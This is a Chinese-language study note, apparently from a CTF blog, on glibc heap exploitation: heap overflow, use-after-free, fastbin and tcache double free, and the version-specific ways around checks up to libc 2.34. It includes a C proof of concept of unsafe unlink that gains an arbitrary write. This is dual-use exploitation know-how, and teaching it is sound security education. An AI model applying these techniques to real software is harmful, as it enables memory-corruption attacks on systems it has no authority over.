    <content type="html"><![CDATA[<blockquote><p>文章很多图源来自NTUSTISC例会视频，油管链接：<a href="https://www.youtube.com/watch?v=ItpJY9Lpw-o&list=PLHP-B3mcSY_5r5AJsZyTZLwjX9z8v_b5x">NTUSTISC - Pwn 3 - YouTube</a><br>目前只支持到libc2.34版本</p></blockquote><h2 id="Heap-Based-Buffer-Overflow"><a href="#Heap-Based-Buffer-Overflow" class="headerlink" title="Heap-Based Buffer Overflow"></a>Heap-Based Buffer Overflow</h2><p>最最基本的攻击方式，由于未对输入长度限制，且堆块是一片连续存储的内存空间特性。导致可以对其后高地址的chunk的各种信息进行覆写。</p><p><img src="/img/article/1.png"></p><p><img src="/img/article/2.png"></p><h2 id="UAF-Use-after-free"><a href="#UAF-Use-after-free" class="headerlink" title="UAF(Use-after-free)"></a>UAF(Use-after-free)</h2><p>在free()掉chunk之后，原本指向chunk的指针由于程序猿自身的懒惰，没有将pointer &#x3D; NULL; 导致依然可以使用该指针进行额外的操作</p><p>UAF漏洞一般常用于泄露，或者更改已经free掉的chunk中的信息，最常见便是libc的泄露,以及对Tcache&#x2F;Fastbin链表的控制</p><blockquote><p>当第一块chunk进入unsorted bin后，他的fd和bk指针会共同指向main_arena+88(具体偏移似乎会随着版本变化，做题时手动调试即可)，意味着当存在UAF漏洞时，我们可以输出这个chunk的内容即能得到libc</p></blockquote><h2 id="Fastbin-Dup"><a href="#Fastbin-Dup" class="headerlink" title="Fastbin Dup"></a>Fastbin Dup</h2><p>fastbin dup 实际是在fastbin链上实现的狭义的double free。由于fastbin 自身源码的缺陷，在对double free 的检测机制仅仅验证了当前free掉的chunk与fast bin 第一个chunk是否相同，而对于其他chunk则没有做检测。另外fastbin在free时会检测当前当前的chunk于头部chunk的size大小是否相同。</p><p>那么构造double free 时只需要穿插一块其他的chunk即可实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>);<br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/article/3.png"></p><p>在完成double free 之后我们只需要malloc 这里的chunk1 就能得到一块 既是allocated 又是 free 状态的chunk。接下来我们就能对其fd指针进行修改，从而控制fastbin链表的方向是我们想要的地方，便能实现对任意地址的控制(读写)</p><p><img src="/img/article/4.png"></p><blockquote><p>额外需要注意的点：</p><ul><li>fastbin会对chunk头的大小进行检测，那么图中malice处chunk的size需要控制好</li><li>libc2.26之后，free的小于0x410的chunk会先进入Tcache中，最多承纳7个chunk</li><li>且在tcache填满之后，malloc优先会取出tcache中的chunk，可以利用calloc不会申请tcache的特点</li></ul></blockquote><h2 id="Tcache-Dup"><a href="#Tcache-Dup" class="headerlink" title="Tcache Dup"></a>Tcache Dup</h2><blockquote><p>Tcache 在最近的几个libc中加入了多个机制，用于保证其安全性，这里我将分不同版本讨论</p></blockquote><h3 id="libc2-26-libc2-28"><a href="#libc2-26-libc2-28" class="headerlink" title="libc2.26-libc2.28"></a>libc2.26-libc2.28</h3><p>在这几个版本中，几乎没有检测机制，对同一块chunk直接进行double free即可，甚至比fastbin dup还要简易</p><h3 id="libc2-29-libc2-31"><a href="#libc2-29-libc2-31" class="headerlink" title="libc2.29-libc2.31"></a>libc2.29-libc2.31</h3><p>在这几个版本中，tcache 的 bk指针处存放了一个8byte的随机数作为key，即代表这块chunk在tcache链中。每次free时，检测bk的位置的值是否为key，若是，则为doublefree。</p><blockquote><p>绕过方式：存在UAF漏洞的情况下，我们可以直接更改，tcache中chunk的key值即可</p></blockquote><h3 id="libc2-32"><a href="#libc2-32" class="headerlink" title="libc2.32"></a>libc2.32</h3><h4 id="Safe-linking-ptr-xor"><a href="#Safe-linking-ptr-xor" class="headerlink" title="Safe-linking(ptr xor)"></a>Safe-linking(ptr xor)</h4><p>libc2.32中引入了Safe-linking机制，应用于fastbin和tcache中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br><span class="hljs-comment">/* Mark this chunk as “in the tcache” so the test in _int_free will</span><br><span class="hljs-comment">detect a double free.  */</span><br>e-&gt;key = tcache;<br><br>e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>tcache-&gt;entries[tc_idx] = e;<br>++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到经glibc-2.32更新后，e-&gt;next不再是直接指向原来的tcache头指针，而是指向了经PROTECT_PTR处理过的指针，查看PROTECT_PTR定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)));</span><br></code></pre></td></tr></table></figure><p>结合tcache_put()函数可以得出e-&gt;next最终指向了e-&gt;next地址右移12位后的值与当前tcache头指针值异或的结果，这里引用Safe-Linking设计师文章[1]中的一张图描述此过程：</p><p><img src="/img/article/5.png" alt="img"></p><p>其实就是一个简单的异或操作，这里所有的指针都进行了处理，具体细节可以自行查询，不过多赘述</p><h4 id="内存对齐检测"><a href="#内存对齐检测" class="headerlink" title="内存对齐检测"></a>内存对齐检测</h4><p>此外，在glibc-2.32版本中还引入了对tcache和fastbins中申请及释放内存地址的对齐检测，以tcache_get()为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br><br>&#123;<br><br>tcache_entry *e = tcache-&gt;entries[tc_idx];<br><br><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br><br>malloc_printerr (“<span class="hljs-built_in">malloc</span>(): unaligned tcache chunk detected”);<br><br>tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br><br>–(tcache-&gt;counts[tc_idx]);<br><br>e-&gt;key = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>aligned_OK()定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT – 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span><br><span class="hljs-meta">? __alignof__ (long double) : 2 * SIZE_SZ)</span><br></code></pre></td></tr></table></figure><p>可以看到内存地址需要以0x10字节对齐。</p><h3 id="libc-2-34"><a href="#libc-2-34" class="headerlink" title="libc-2.34"></a>libc-2.34</h3><p>glibc-2.34 的到来给予了hook劫持沉重的一击，移除了以下几个hook符号：</p><blockquote><p>__free_hook</p><p>__malloc_hook</p><p>__realloc_hook</p><p>__memalign_hook</p><p>__after_morecore_hook</p></blockquote><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><ol><li>利用IO_vtable</li><li>利用exit_hook</li><li>劫持返回地址进行ROP</li></ol><h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h2><p>unsafe-unlink利用chunkfree时的合并机制，实现了地址的任意读写</p><blockquote><p>使用条件：</p><ul><li>能够利用溢出或其他漏洞，将某chunk的size域的最低16进制位修改为0，例: 0x91 –&gt; 0x90</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*这是一段unsafe-unlink的示例代码，我们在最后成功利用这个漏洞，</span><br><span class="hljs-comment">实现了对非堆上地址victimstring的内容更改*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">uint64_t</span> * chunk0_ptr;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    chunk0_ptr = (<span class="hljs-type">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);       <span class="hljs-comment">//chunk0</span><br>    <span class="hljs-type">uint64_t</span> *chunk1_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);        <span class="hljs-comment">//chunk1</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk0_ptr: %p -&gt; %p\n&quot;</span>,&amp;chunk0_ptr, chunk0_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim chunk: %p\n\n&quot;</span>,chunk1_ptr);<br><br>    <span class="hljs-comment">/*pass the check:   (chunksize(p) != prev_size(next_chunk(P)) == False)</span><br><span class="hljs-comment">                        chunk0_ptr[1] = 0x0;// or 0x8, 0x80*/</span><br><br>    <span class="hljs-comment">//pass the check:   (p-&gt;fd-&gt;bk != p || p-&gt;bk-&gt;fd != p) == False</span><br><br>    chunk0_ptr [<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr - <span class="hljs-number">0x18</span>;<br>    chunk0_ptr [<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr - <span class="hljs-number">0x10</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fake fd: %p = &amp;chunk0_ptr - 0x18&quot;</span>, (<span class="hljs-type">void</span>*)chunk0_ptr[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fake bk: %p = &amp;chunk0_ptr - 0x10&quot;</span>, (<span class="hljs-type">void</span>*)chunk0_ptr[<span class="hljs-number">3</span>]);<br>    <br>    <span class="hljs-type">uint64_t</span> *chunk1_hdr = (<span class="hljs-type">void</span>*) chunk1_ptr - <span class="hljs-number">0x10</span>;<br>    chunk1_hdr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x80</span>;<br>    chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/*  int *t[10], i;                  //tcache</span><br><span class="hljs-comment">        for(i=0; i&lt;7; i++)&#123;</span><br><span class="hljs-comment">            t[i] = malloc(0x80);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        for(i=0;i&lt;7;i++)&#123;</span><br><span class="hljs-comment">            free(t[i]);</span><br><span class="hljs-comment">        &#125;;  */</span><br><br>    <span class="hljs-built_in">free</span>(chunk1_ptr);               <span class="hljs-comment">//unlink</span><br><br>    <span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>] = <span class="hljs-string">&quot;AAAAAAA&quot;</span>;<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;   <span class="hljs-comment">//overwrite itself</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;old value: %s\n&quot;</span>, victim_string);<br><br>    chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x42424242424242</span>LL;     <span class="hljs-comment">//over wirting victim_string</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;new Value: %s\n&quot;</span>, victim_string);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="示例图"><a href="#示例图" class="headerlink" title="示例图"></a>示例图</h4><p><img src="/img/article/6.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
